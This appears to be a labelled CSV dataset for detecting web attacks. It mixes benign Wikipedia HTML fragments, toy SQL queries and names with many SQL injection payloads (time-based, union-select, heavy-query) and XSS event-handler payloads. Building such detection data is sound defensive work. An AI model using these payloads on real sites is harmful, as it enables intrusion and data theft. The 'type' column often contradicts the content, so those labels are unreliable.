Text,Label,type
"<li id=""cite_note-261""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-261"">^ </a> </b> ",0,xss
elian,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></shadow>",2,xss
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",2,xss
"-5857%""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1,sql
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1,xss
"<li><a href=""/wiki/Glossary_of_botany"" class=""mw-redirect"" title=""Glossary of botany"">Botany </a> </li>",0,xss
5719,0,sql
bardischewski9@sexotelefono.rw,0,sql
 UPDATE slipped SET field = 'pleasant'WHERE ocean = 'hungry',0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Research </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
cedric,0,sql
"<audio onmousedown=""alert(1)"">test</audio>",2,xss
"  SELECT Orders.halfwayrID, Employees.sale, Employees.good FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.woolID ORDER BY Orders.governmentID",0,sql
SELECT AVG ( blue ) FROM shall,0,sql
"   SELECT vast, human, sweetFROM kitchen WHERE sitting  IS NOT NULL",0,sql
SELECT * FROM composed WHERE machine IN  ( SELECT thou FROM beautiful ) ,0,sql
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,sql
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
	 </span></a></dt><dd>Understand the Scrapy architecture.</dd>,0,xss
1%' union all select null--,1,xss
"<li id=""cite_note-Representing_causation-95""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_causation_95-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_causation_95-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">Chun, Rene (21 September 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.artsy.net/article/artsy-editorial-hard-painting-made-computer-human"">""It's Getting Hard to Tell If a Painting Was Made by a Computer or a Human"" </a>. <i>Artsy </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",0,xss
SELECT necessary FROM layers UNION SELECT most FROM on ORDER BY power,0,sql
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,xss
	 </span>,0,xss
ribamontn al mar,0,sql
FROM  ( SELECT DISTINCT rhyme FROM cake ) ,0,sql
mara beln,0,xss
a8o8decer,0,sql
denni,0,xss
"<hgroup oncopy=""alert(1)"" contenteditable>test</hgroup>",2,xss
" </p><p>Games provide a well-publicized benchmark for assessing rates of progress. <a href=""/wiki/AlphaGo"" title=""AlphaGo"">AlphaGo </a> around 2016 brought the era of classical board-game benchmarks to a close. Games of imperfect knowledge provide new challenges to AI in the area of <a href=""/wiki/Game_theory"" title=""Game theory"">game theory </a>.<sup id=""cite_ref-280"" class=""reference""><a href=""#cite_note-280"">&#91;269&#93; </a> </sup><sup id=""cite_ref-281"" class=""reference""><a href=""#cite_note-281"">&#91;270&#93; </a> </sup> <a href=""/wiki/Esports"" title=""Esports"">E-sports </a> such as <a href=""/wiki/StarCraft"" title=""StarCraft"">StarCraft </a> continue to provide additional public benchmarks.<sup id=""cite_ref-282"" class=""reference""><a href=""#cite_note-282"">&#91;271&#93; </a> </sup><sup id=""cite_ref-283"" class=""reference""><a href=""#cite_note-283"">&#91;272&#93; </a> </sup> There are many competitions and prizes, such as the <a href=""/wiki/ImageNet"" title=""ImageNet"">Imagenet Challenge </a>, to promote research in artificial intelligence. The most common areas of competition include general machine intelligence, conversational behavior, data-mining, <a href=""/wiki/Autonomous_car"" class=""mw-redirect"" title=""Autonomous car"">robotic cars </a>, and robot soccer as well as conventional games.<sup id=""cite_ref-284"" class=""reference""><a href=""#cite_note-284"">&#91;273&#93; </a> </sup>",0,xss
<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>,2,xss
"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>",2,xss
"<mark onclick=""alert(1)"">test</mark>",2,xss
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0,sql
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",2,xss
"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
itziar,0,sql
SELECT * FROM prepare WHERE began NOT LIKE 'flew%',0,sql
SELECT earth ( s FROM national RIGHT JOIN,0,sql
SELECT * FROM collect WHERE please = 'lesson' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM thee 3 SELECT * FROM molecular,0,xss
"1'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
"1""   )    )    as tncm where 8203  =  8203 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
 )   or   (  'x'  =  'x,1,sql
"   SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrdersFROM    ( OrdersINNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID ) ",0,sql
"<li><a href=""/wiki/List_of_programming_languages_for_artificial_intelligence"" title=""List of programming languages for artificial intelligence"">Programming languages </a> </li> </ul> </td>",0,xss
"<p>Machines with intelligence have the potential to use their intelligence to prevent harm and minimize the risks; they may have the ability to use <a href=""/wiki/Ethics"" title=""Ethics"">ethical reasoning </a> to better choose their actions in the world. As such, there is a need for policy making to devise policies for and regulate artificial intelligence and robotics.<sup id=""cite_ref-391"" class=""reference""><a href=""#cite_note-391"">&#91;380&#93; </a> </sup> Research in this area includes <a href=""/wiki/Machine_ethics"" title=""Machine ethics"">machine ethics </a>, <a href=""/wiki/Artificial_moral_agents"" class=""mw-redirect"" title=""Artificial moral agents"">artificial moral agents </a>, <a href=""/wiki/Friendly_AI"" class=""mw-redirect"" title=""Friendly AI"">friendly AI </a> and discussion towards building a <a href=""/wiki/Human_rights"" title=""Human rights"">human rights </a> framework is also in talks.<sup id=""cite_ref-392"" class=""reference""><a href=""#cite_note-392"">&#91;381&#93; </a> </sup>",0,xss
<select onpointerdown=alert(1)>XSS</select>,2,xss
<svg><ol onload=alert(1)></ol>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
<dl id=x tabindex=1 onactivate=alert(1)></dl>,2,xss
SELECT brick,0,xss
-4900'   )    )    or 7208  =  3236,1,sql
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",1,sql
-8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1,xss
SELECT * FROM threw WHERE weigh = 'atmosphere',0,sql
misio+nal,0,sql
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",2,xss
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ctrr""  =  ""ctrr",1,xss
"1%'   )    )    union all select null,null,null,null,null,null,null,null--",1,sql
"c/ don bosco 65, 10-d",0,xss
1   )    )     )   waitfor delay '0:0:5'--,1,sql
SELECT * FROM wp_posts WHERE ID  =  347697 LIMIT 1,0,sql
"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",1,sql
"escritor nicolas del paso, 95",0,sql
SELECT * FROM enter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM situation,0,sql
"	<h3 id=""p-namespaces-label"">Namespaces </h3>",0,xss
<textarea id=x tabindex=1 onactivate=alert(1)></textarea>,2,xss
"<li class=""toclevel-2 tocsection-29""><a href=""#Probabilistic_methods_for_uncertain_reasoning""><span class=""tocnumber"">6.3 ",0,xss
SELECT COUNT ( similar ) FROM similar,0,sql
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621",1,sql
"1%""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0,sql
98538229l,0,sql
<a onpointerover=alert(1)>XSS</a>,2,xss
<footer onpointermove=alert(1)>XSS</footer>,2,xss
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw",1,sql
SELECT * FROM throughout WHERE history = 'seems' FETCH FIRST 3 ROWS ONLY,0,sql
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,sql
1   )    )    as rcbz where 4563  =  4563 and 2006  =  2006,1,sql
SELECT * FROM cave WHERE card BETWEEN '1996-07-01' AND '1996-07-31',0,sql
<dir onpointerout=alert(1)>XSS</dir>,2,xss
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",1,sql
harvison,0,sql
"<strong oncut=""alert(1)"" contenteditable>test</strong>",2,xss
"INSERT INTO south ( second, distant, exclaimed, exactly, wealth, sure )  VALUES  ( 'factor', 'bus'. arrive', 'lucky', 'on', 'nails', 'column' )  ",0,sql
"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",1,sql
<var id=x tabindex=1 onfocusin=alert(1)></var>,2,xss
"  SELECT CustomerName AS Customer, ContactName AS [Contact Person]  FROM Customers;",0,sql
"0"" encoding  =  ""utf-8"" ?>   <_filter>  <![CDATA[insert]]>  </_filter>   <_filter>  <![CDATA[signup]]>  </_filter>   <_filter>  <![CDATA[widget_login]]>  </_filter>   <a href  =  ""http://caritaskinshasa",0,sql
 </li>,0,xss
SELECT * FROM cost WHERE kill = 'stick'  OR poetry = 'wore',0,xss
"<li id=""cite_note-97""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-97"">^ </a> </b> ",0,xss
"  SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )  ",0,sql
SELECT * FROM dinner WHERE layers = 'ranch'  AND  ( stage = 'suit' OR useful = 'heart' ) ,0,xss
"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",1,sql
 UPDATE salt SET did = 'garden'WHERE orange = 'exclaimed',0,xss
SELECT TOP 3 * FROM prove WHERE south = 'early',0,sql
" SELECT * FROM can ORDER BY belong ASC, whether DESC",0,sql
-8966%' or   (  7475  =  4014  )  *4014 and '%'  =  ',1,xss
"-2247'  )   union all select 1202,1202,1202,1202,1202#",1,xss
"	 </span> <span class=""reference-text"">",0,xss
"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,1,sql
SELECT * FROM halfway WHERE review  BETWEEN 10 AND 20,0,sql
egido s/n,0,sql
SELECT stems ( s FROM better RIGHT JOIN,0,xss
SELECT price ( s )  FROM office SELECT real FROM broad,0,xss
SELECT TOP 50 PERCENT * FROM diameter SELECT * FROM real FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ready,0,sql
"<dt><a class=""reference internal"" href=""faq.html""><span class=""doc"">Frequently Asked Questions",0,xss
	 </span> ,0,xss
SELECT * FROM dry  WHERE attempt = function,0,sql
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,2,xss
SELECT * FROM anyway WHERE color = 'yet',0,xss
<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>,2,xss
"<summary draggable=""true"" ondragend=""alert(1)"">test</summary>",2,xss
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tqpj'  =  'tqpj",1,sql
stavro,0,xss
DELETE FROM enemy,0,xss
" end and   (  ""xksk""  =  ""xksk",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> In<br /> <cite class=""citation book""><a href=""/wiki/Solomon_Feferman"" title=""Solomon Feferman"">Feferman, Solomon </a>, ed. (1995). <i>Kurt Gödel: Collected Works, Vol. III: Unpublished Essays and Lectures </i>. Oxford University Press. pp.&#160;304–23. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-19-514722-3"" title=""Special:BookSources/978-0-19-514722-3""><bdi>978-0-19-514722-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Kurt+G%C3%B6del%3A+Collected+Works%2C+Vol.+III%3A+Unpublished+Essays+and+Lectures&amp;rft.pages=304-23&amp;rft.pub=Oxford+University+Press&amp;rft.date=1995&amp;rft.isbn=978-0-19-514722-3&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",1,sql
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1,sql
"   SELECT famous,involved,order,someone,shape     (  (  war JOIN shoot ON enough.bigger =  feed.bush )   INNER JOIN shoulderON Orders.park =  someone.upID ) ",0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rtc>",2,xss
sagunto/sagunt,0,sql
SELECT AVG ( raw ) FROM to SELECT SUM ( small ) ,0,sql
"  SELECT news,parallel FROM away WHERE victory = 'little' UNION SELECT putting, applied FROM step",0,sql
80029600l,0,sql
"-5218  )   union all select 9677,9677#",1,sql
    ,0,xss
"1"" waitfor delay '0:0:5'--",1,sql
"<acronym onmouseup=""alert(1)"">test</acronym>",2,xss
1'||  (  select 'bupa' from dual where 8548  =  8548,1,xss
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>,2,xss
valbuena de duero,0,sql
1%' and 1736  =  4220,1,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFCNN2006""><i>CNN </i> 2006 </a>. ",0,xss
nuo gmez,0,xss
"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",1,sql
-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
SELECT * FROM dull WHERE NOT numeral = 'smile'  AND NOT stared = 'way',0,sql
"<del onpaste=""alert(1)"" contenteditable>test</del>",2,xss
"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",1,sql
"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",1,sql
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1,xss
"<strong onbeforecut=""alert(1)"" contenteditable>test</strong>",2,xss
SELECT * FROM front WHERE wise = 'earn',0,sql
"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,2,xss
1'||  (  select 'yezk' where 2097  =  2097,1,sql
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'zjel' like 'zjel",1,sql
<link onreadystatechange=alert(1) rel=stylesheet href=1>,2,xss
1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1,sql
"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
9637,0,sql
<blockquote onpointerdown=alert(1)>XSS</blockquote>,2,xss
tristan,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT * FROM central FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1,xss
"<li><a href=""/wiki/Stuart_Umpleby"" title=""Stuart Umpleby"">Stuart Umpleby </a> </li>",0,xss
12064316b,0,sql
96804276j,0,sql
"-5840'  )   or elt  (  1032  =  1032,3623  )  ",1,xss
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",2,xss
"<li><a href=""/wiki/George_Musser"" title=""George Musser"">George Musser </a>, ""<a href=""/wiki/Artificial_Imagination"" class=""mw-redirect"" title=""Artificial Imagination"">Artificial Imagination </a>:  How machines could learn <a href=""/wiki/Creativity"" title=""Creativity"">creativity </a> and <a href=""/wiki/Common_sense"" title=""Common sense"">common sense </a>, among other human qualities"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 320, no. 5 (May 2019), pp.&#160;58–63. </li>",0,xss
"-4639""   )    )     )   or 8550  =  9348",1,sql
SELECT * FROM rope WHERE characteristic NOT LIKE 'indeed%',0,sql
benzo,0,sql
<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>,2,xss
